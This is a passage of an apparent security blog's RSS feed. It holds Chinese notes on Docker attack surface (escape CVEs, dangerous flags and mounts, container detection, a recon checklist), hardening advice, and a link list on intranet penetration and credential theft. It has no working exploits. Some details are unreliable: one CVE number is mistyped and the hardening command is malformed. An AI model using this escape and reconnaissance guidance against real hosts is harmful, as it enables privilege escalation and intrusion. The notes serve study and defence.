&lt;p&gt;使用 Docker 运行容器意味着运行 Docker 守护进程，而这个守护进程当前需要 root 权限，因此，守护进程是需要考虑的一个地方。&lt;/p&gt;
&lt;p&gt;首先，只有受信任的用户才能被允许控制 Docker 守护进程。具体来说，Docker 允许您在 Docker 主机和访客容器之间共享一个目录；它允许你这样做而不限制容器的访问权限。这意味着可以启动一个容器，其中 /host 目录将成为主机上的 / 目录，容器将能够不受任何限制地改变主机文件系统。&lt;/p&gt;
&lt;p&gt;这具有很强的安全意义：例如，如果通过 Web 服务器测试 Docker 以通过 API 配置容器，则应该更加仔细地进行参数检查，以确保恶意用户无法传递制作的参数，从而导致 Docker 创建任意容器。&lt;/p&gt;
&lt;p&gt;守护进程也可能容易受到其他输入的影响，例如从具有 docker 负载的磁盘或从具有 docker pull 的网络加载映像。&lt;/p&gt;
&lt;p&gt;最终，预计 Docker 守护进程将运行受限特权，将操作委托给审核良好的子进程，每个子进程都有自己的（非常有限的）Linux 功能范围，虚拟网络设置，文件系统管理等。也就是说，很可能，Docker 引擎本身的部分将在容器中运行。&lt;/p&gt;
&lt;h2 id=&#34;capability&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#capability&#34;&gt;#&lt;/a&gt; Capability&lt;/h2&gt;
&lt;p&gt;默认情况下，Docker 采用 Capability 机制来实现用户在以 root 身份运行容器的同时，限制部分 root 的操作。&lt;/p&gt;
&lt;p&gt;在大多数情况下，容器不需要真正的 root 权限。因此，Docker 可以运行一个 Capability 较低的集合，这意味着容器中的 root 比真正的 root 要少得多。例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;否认所有挂载操作&lt;/li&gt;
&lt;li&gt;拒绝访问原始套接字（防止数据包欺骗）&lt;/li&gt;
&lt;li&gt;拒绝访问某些文件系统操作，如创建新的设备节点，更改文件的所有者或修改属性（包括不可变标志）&lt;/li&gt;
&lt;li&gt;拒绝模块加载&lt;/li&gt;
&lt;li&gt;其他&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这意味着，即使入侵者在容器内获取 root 权限，进一步攻击也会困难很多。默认情况下，Docker 使用白名单而不是黑名单，去除了所有非必要的功能。&lt;/p&gt;
&lt;h2 id=&#34;seccomp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#seccomp&#34;&gt;#&lt;/a&gt; Seccomp&lt;/h2&gt;
&lt;p&gt;Docker 使用 Seccomp 来限制容器对宿主机内核发起的系统调用。&lt;/p&gt;
&lt;h1 id=&#34;攻击面分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击面分析&#34;&gt;#&lt;/a&gt; 攻击面分析&lt;/h1&gt;
&lt;h2 id=&#34;供应链安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#供应链安全&#34;&gt;#&lt;/a&gt; 供应链安全&lt;/h2&gt;
&lt;p&gt;在构建 Dockerfile 的过程中，即使是使用排名靠前的来源，也可能存在 CVE 漏洞、后门、镜像被污染、镜像中的依赖库存在漏洞等问题。&lt;/p&gt;
&lt;h2 id=&#34;虚拟化风险&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟化风险&#34;&gt;#&lt;/a&gt; 虚拟化风险&lt;/h2&gt;
&lt;p&gt;虽然 Docker 通过命名空间进行了文件系统资源的基本隔离，但仍有  &lt;code&gt;/sys&lt;/code&gt;  、 &lt;code&gt;/proc/sys&lt;/code&gt;  、  &lt;code&gt;/proc/bus&lt;/code&gt;  、  &lt;code&gt;/dev&lt;/code&gt;  、 &lt;code&gt;time&lt;/code&gt;  、 &lt;code&gt;syslog&lt;/code&gt;  等重要系统文件目录和命名空间信息未实现隔离，而是与宿主机共享相关资源。&lt;/p&gt;
&lt;h2 id=&#34;利用内核漏洞逃逸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用内核漏洞逃逸&#34;&gt;#&lt;/a&gt; 利用内核漏洞逃逸&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2022-0847 Dirty Pipe&lt;/li&gt;
&lt;li&gt;CVE-2021-4034 Polkit&lt;/li&gt;
&lt;li&gt;CVE-2018-18955&lt;/li&gt;
&lt;li&gt;CVE-2016-5195&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;容器逃逸漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器逃逸漏洞&#34;&gt;#&lt;/a&gt; 容器逃逸漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2021-41091&lt;/li&gt;
&lt;li&gt;CVE-2020-15257 Containerd 逃逸
&lt;ul&gt;
&lt;li&gt;需要网络设置为 host 模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-14271 Docker cp&lt;/li&gt;
&lt;li&gt;CVE-2019-13139 Docker build code execution&lt;/li&gt;
&lt;li&gt;CVE-2019-5736 runC
&lt;ul&gt;
&lt;li&gt;Docker Version &amp;lt; 18.09.2&lt;/li&gt;
&lt;li&gt;Version &amp;lt;= 1.0-rc6&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;配置不当&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置不当&#34;&gt;#&lt;/a&gt; 配置不当&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;开启 privileged&lt;/li&gt;
&lt;li&gt;挂载宿主机敏感目录&lt;/li&gt;
&lt;li&gt;配置 cap 不当
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--cap-add=SYS_ADMIN&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;绕过 namespace
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--net=host&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--pid=host&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--ipc=host&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;拒绝服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拒绝服务&#34;&gt;#&lt;/a&gt; 拒绝服务&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CPU 耗尽&lt;/li&gt;
&lt;li&gt;内存耗尽&lt;/li&gt;
&lt;li&gt;存储耗尽&lt;/li&gt;
&lt;li&gt;网络资源耗尽&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;危险挂载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危险挂载&#34;&gt;#&lt;/a&gt; 危险挂载&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;挂载  &lt;code&gt;/var/run/docker.sock&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;挂载宿主机  &lt;code&gt;/dev&lt;/code&gt;   &lt;code&gt;/proc&lt;/code&gt;  等危险目录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;攻击-docker-守护进程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击-docker-守护进程&#34;&gt;#&lt;/a&gt; 攻击 Docker 守护进程&lt;/h2&gt;
&lt;p&gt;虽然 Docker 容器具有很强的安全保护措施，但是 Docker 守护进程本身并没有被完善的保护。Docker 守护进程本身默认由 root 用户运行，并且该进程本身并没有使用 Seccomp 或者 AppArmor 等安全模块进行保护。这使得一旦攻击者成功找到漏洞控制 Docker 守护进程进行任意文件写或者代码执行，就可以顺利获得宿主机的 root 权限而不会受到各种安全机制的阻碍。值得一提的是，默认情况下 Docker 不会开启 User Namespace 隔离，这也意味着 Docker 内部的 root 与宿主机 root 对文件的读写权限相同。这导致一旦容器内部 root 进程获取读写宿主机文件的机会，文件权限将不会成为另一个问题。这一点在 CVE-2019-5636 利用中有所体现。&lt;/p&gt;
&lt;h2 id=&#34;其他cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他cve&#34;&gt;#&lt;/a&gt; 其他 CVE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2014-5277&lt;/li&gt;
&lt;li&gt;CVE-2014-6408&lt;/li&gt;
&lt;li&gt;CVE-2014-9357&lt;/li&gt;
&lt;li&gt;CVE-2014-9358&lt;/li&gt;
&lt;li&gt;CVE-2015-3627&lt;/li&gt;
&lt;li&gt;CVE-2015-3630&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;安全加固&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全加固&#34;&gt;#&lt;/a&gt; 安全加固&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;最小安装
&lt;ul&gt;
&lt;li&gt;删除所有开发工具（编译器等）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;更新系统源&lt;/li&gt;
&lt;li&gt;启用 AppArmor&lt;/li&gt;
&lt;li&gt;启用 SELinux&lt;/li&gt;
&lt;li&gt;限制运行容器的内核功能&lt;/li&gt;
&lt;li&gt;移除依赖构建&lt;/li&gt;
&lt;li&gt;配置严格的网络访问控制策略&lt;/li&gt;
&lt;li&gt;不使用 root 用户启动 docker&lt;/li&gt;
&lt;li&gt;不以 privileged 特权模式运行容器&lt;/li&gt;
&lt;li&gt;控制资源
&lt;ul&gt;
&lt;li&gt;CPU Share&lt;/li&gt;
&lt;li&gt;CPU 核数&lt;/li&gt;
&lt;li&gt;内存资源&lt;/li&gt;
&lt;li&gt;IO 资源&lt;/li&gt;
&lt;li&gt;磁盘资源&lt;/li&gt;
&lt;li&gt;硬件资源&lt;/li&gt;
&lt;li&gt;单位时间内进程数量上限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用安全的基础镜像&lt;/li&gt;
&lt;li&gt;定期安全扫描和更新补丁&lt;/li&gt;
&lt;li&gt;删除镜像中的 setuid 和 setgid 权限
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;RUN find / -perm +6000-type f-exec chmod a-s &amp;#123;&amp;#125; \;|| true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;配置 Docker 守护程序的 TLS 身份验证&lt;/li&gt;
&lt;li&gt;如非必要 禁止容器间通信&lt;/li&gt;
&lt;li&gt;rootless Docker
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nZXQuZG9ja2VyLmNvbS9yb290bGVzcw==&#34;&gt;https://get.docker.com/rootless&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用 Seccomp 限制 syscall&lt;/li&gt;
&lt;li&gt;构建环境和在线环境分开&lt;/li&gt;
&lt;li&gt;证书校验&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;docker-环境识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker-环境识别&#34;&gt;#&lt;/a&gt; Docker 环境识别&lt;/h1&gt;
&lt;h2 id=&#34;docker内&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker内&#34;&gt;#&lt;/a&gt; Docker 内&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;MAC 地址为  &lt;code&gt;02:42:ac:11:00:00&lt;/code&gt;  -  &lt;code&gt;02:42:ac:11:ff:ff&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ps aux&lt;/code&gt;  大部分运行的程序 pid 都很小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat /proc/1/cgroup&lt;/code&gt;  docker 的进程&lt;/li&gt;
&lt;li&gt;docker 环境下存在  &lt;code&gt;.dockerenv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;部分容器中缺少许多常用的命令如  &lt;code&gt;ping&lt;/code&gt;  等&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;docker外&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker外&#34;&gt;#&lt;/a&gt; Docker 外&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/var/run/docker.sock&lt;/code&gt;  文件存在&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2375&lt;/code&gt;  /  &lt;code&gt;2376&lt;/code&gt;  端口开启&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;容器内信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器内信息收集&#34;&gt;#&lt;/a&gt; 容器内信息收集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用户信息 (当前用户、用户列表)&lt;/li&gt;
&lt;li&gt;操作系统与内核版本&lt;/li&gt;
&lt;li&gt;运行进程信息 (进程名、权限等)&lt;/li&gt;
&lt;li&gt;容器是否为特权容器&lt;/li&gt;
&lt;li&gt;环境变量&lt;/li&gt;
&lt;li&gt;判断容器挂载信息，尝试挂载 Docker Socket&lt;/li&gt;
&lt;li&gt;网络环境，判断可以到达的网段&lt;/li&gt;
&lt;li&gt;在云环境中，尝试获取元数据信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#镜像&#34;&gt;#&lt;/a&gt; 镜像&lt;/h1&gt;
&lt;h2 id=&#34;基本概念-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念-2&#34;&gt;#&lt;/a&gt; 基本概念&lt;/h2&gt;
&lt;p&gt;Docker 镜像可以看作是一个特殊的文件系统，用于提供容器运行时所需的文件，同时镜像还包含了一些为运行时准备的一些信息（环境变量、用户等）。&lt;/p&gt;
&lt;p&gt;在构建之后镜像不会被改变，即是说镜像中不会包含动态的数据。&lt;/p&gt;
&lt;h2 id=&#34;windows-镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows-镜像&#34;&gt;#&lt;/a&gt; Windows 镜像&lt;/h2&gt;
&lt;p&gt;由于 Windows 并不直接开放 syscall ，所有的 Windows 程序都必须通过 sys dll 与内核沟通，这就导致 Windows 镜像并不能直接通过 scratch 来构建，只能基于微软提供的几个基础镜像来构建。&lt;/p&gt;
&lt;p&gt;镜像包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dzLXNlcnZlcmNvcmU=&#34;&gt;windows servercore&lt;/span&gt; 功能最完整，包含传统的 .net framework 环境&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dzLW5hbm9zZXJ2ZXI=&#34;&gt;windows nanoserver&lt;/span&gt; 包含 .net core 运行环境&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dz&#34;&gt;windows&lt;/span&gt; 提供完整的 windows server api，正在被 windows server 替代&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL21pY3Jvc29mdC13aW5kb3dzLXNlcnZlci8=&#34;&gt;windows server&lt;/span&gt; 提供完整的 windows server api&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;安全分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全分析&#34;&gt;#&lt;/a&gt; 安全分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmhlcm9rdS5jb20vZXhwbG9yYXRpb24tb2Ytc2VjdXJpdHktd2hlbi1idWlsZGluZy1kb2NrZXItY29udGFpbmVycw==&#34;&gt;A House of Cards An Exploration of Security When Building Docker Containers&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL29icm93bi5pby8yMDE2LzAyLzE1L3ByaXZpbGVnZWQtY29udGFpbmVycy5odG1s&#34;&gt;Privileged Docker Containers&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9raXRjdGYuZGUvd3JpdGV1cHMvMzJjM2N0Zi9kb2NrZXI=&#34;&gt;32c3 docker writeup&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnFpbml1LmNvbS9hcmNoaXZlcy83NzQz&#34;&gt;打造安全的容器云平台&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L3NlY3VyaXR5Lw==&#34;&gt;Docker security&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvZG9ja2VyLW1pcnJvci1zZWN1cml0eS8=&#34;&gt;容器安全&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zdHJtLnNoL3Bvc3QvYWJ1c2luZy1pbnNlY3VyZS1kb2NrZXItZGVwbG95bWVudHMv&#34;&gt;CVE-2017-7494 Docker 沙箱逃逸&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIyMTMxOS5odG1s&#34;&gt;Docker 容器安全性分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3NlY3VyaXR5L2FwcGFybW9yLw==&#34;&gt;AppArmor security profiles for Docker&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RvY2tlci9kb2NrZXItYmVuY2gtc2VjdXJpdHk=&#34;&gt;Docker Bench for Security&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZDlEM3oxM3VDT0pvSnpwbHB1M1dKUQ==&#34;&gt;Docker 安全性与攻击面分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Pfleeger C P , Pfleeger S L , Theofanos M F . A methodology for penetration testing[J]. Computers &amp;amp; Security, 1989, 8(7):613-620.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows&#34;&gt;#&lt;/a&gt; Windows&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3ZpcnR1YWxpemF0aW9uL3dpbmRvd3Njb250YWluZXJzL21hbmFnZS1jb250YWluZXJzL2NvbnRhaW5lci1iYXNlLWltYWdlcw==&#34;&gt;Container Base Images&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%AE%B9%E5%99%A8/</guid>
            <title>容器</title>
            <link>https://mobius-0.github.io/security/WebNote/Cloud%20Security/%E5%AE%B9%E5%99%A8/</link>
            <category>标准</category>
            <category>OCI</category>
            <category>CRI</category>
            <pubDate>Tue, 29 Nov 2022 16:21:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;oci&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oci&#34;&gt;#&lt;/a&gt; OCI&lt;/h1&gt;
&lt;p&gt;开放容器标准 (Open Container Initiative, OCI) 是用于规范容器格式和运行时行业标准。目前 OCI 提出的规范有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL3J1bnRpbWUtc3BlYw==&#34;&gt;OCI Runtime Specification&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL2ltYWdlLXNwZWM=&#34;&gt;OCI Image Format&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL2Rpc3RyaWJ1dGlvbi1zcGVj&#34;&gt;OCI Distribution Specification&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;cri&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cri&#34;&gt;#&lt;/a&gt; CRI&lt;/h1&gt;
&lt;p&gt;容器运行时 (Container Runtime Interface, CRI) 定义了容器和镜像的接口，目前官方支持的容器运行时包括 Docker、Containerd、CRI-O 和 frakti。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文档&#34;&gt;#&lt;/a&gt; 文档&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2Jsb2cvMjAxNi8xMi9jb250YWluZXItcnVudGltZS1pbnRlcmZhY2UtY3JpLWluLWt1YmVybmV0ZXMv&#34;&gt;Introducing Container Runtime Interface (CRI) in Kubernetes&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcmktby5pby8=&#34;&gt;cri-o&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现&#34;&gt;#&lt;/a&gt; 实现&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL29wZW5jb250YWluZXJzL3J1bmM=&#34;&gt;runc&lt;/span&gt; OCI Runtime 的参考实现&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2thdGEtY29udGFpbmVycy9rYXRhLWNvbnRhaW5lcnM=&#34;&gt;Kata Containers&lt;/span&gt; 提供高性能的硬件虚拟化容器运行时&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9ndmlzb3I=&#34;&gt;gvisor&lt;/span&gt; Go 实现的基于用户态内核的容器运行时&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21vYnkvYnVpbGRraXQ=&#34;&gt;buildkit&lt;/span&gt; docker build 拆分出来的 build 项目&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</guid>
            <title>参考文档</title>
            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</link>
            <category>内网</category>
            <pubDate>Tue, 29 Nov 2022 16:03:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows&#34;&gt;#&lt;/a&gt; Windows&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi8=&#34;&gt;Windows 威胁防护&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naDBzdC5jbi9hcmNoaXZlcy8yMDE3LTAzLTI5LzE=&#34;&gt;文件寄生 NTFS 文件流实际应用&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ2MQ==&#34;&gt;Windows 中常见后门持久化方法总结&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8vIw==&#34;&gt;LOLBAS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLzNnc3R1ZGVudC5naXRodWIuaW8vJUU2JUI4JTk3JUU5JTgwJThGJUU2JThBJTgwJUU1JUI3JUE3LVdpbmRvd3MlRTUlOEQlOTUlRTYlOUQlQTElRTYlOTclQTUlRTUlQkYlOTclRTclOUElODQlRTUlODglQTAlRTklOTklQTQv&#34;&gt;渗透技巧 ——Windows 单条日志的删除&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzE1NQ==&#34;&gt;windows 取证 文件执行记录的获取和清除&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMjAvMS8xNC9nZXR0aW5nLWRucy1jbGllbnQtY2FjaGVkLWVudHJpZXMtd2l0aC1jaW13bWk=&#34;&gt;Getting DNS Client Cached Entries with CIM/WMI&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZW5namliby5naXRodWIuaW8vUGVyc2lzdGVuY2Uv&#34;&gt;Windows 单机 Persistence&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAyMS8wNS8yNC9kdW1waW5nLXJkcC1jcmVkZW50aWFscy8=&#34;&gt;Dumping RDP Credentials&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;域渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域渗透&#34;&gt;#&lt;/a&gt; 域渗透&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvMjUxMC5odG1s&#34;&gt;绕过域账户登录失败次数的限制&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpnM056RTVPVEE1TlE9PSZhbXA7bWlkPTIyNDc0ODM4MDcmYW1wO2lkeD0xJmFtcDtzbj01OWJlNTBhYTVjYzczNWYwNTVkYjU5NjI2OWE4NTdjZQ==&#34;&gt;域渗透总结&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0BhZGFtLnRvc2NoZXIvdG9wLWZpdmUtd2F5cy1pLWdvdC1kb21haW4tYWRtaW4tb24teW91ci1pbnRlcm5hbC1uZXR3b3JrLWJlZm9yZS1sdW5jaC0yMDE4LWVkaXRpb24tODIyNTlhYjczYWFh&#34;&gt;got domain admin on internal network&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Rvd25sb2FkLm1pY3Jvc29mdC5jb20vZG93bmxvYWQvNy83L0EvNzdBQkM1QkQtODMyMC00MUFGLTg2M0MtNkVDRkIxMENCNEI5L01pdGlnYXRpbmclMjBQYXNzLXRoZS1IYXNoJTIwKFB0SCklMjBBdHRhY2tzJTIwYW5kJTIwT3RoZXIlMjBDcmVkZW50aWFsJTIwVGhlZnQlMjBUZWNobmlxdWVzX0VuZ2xpc2gucGRm&#34;&gt;Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0FjdGl2ZS1EaXJlY3RvcnktUGVudGVzdC1Ob3Rlcw==&#34;&gt;域渗透学习笔记&lt;/span&gt;&lt;/li&gt;
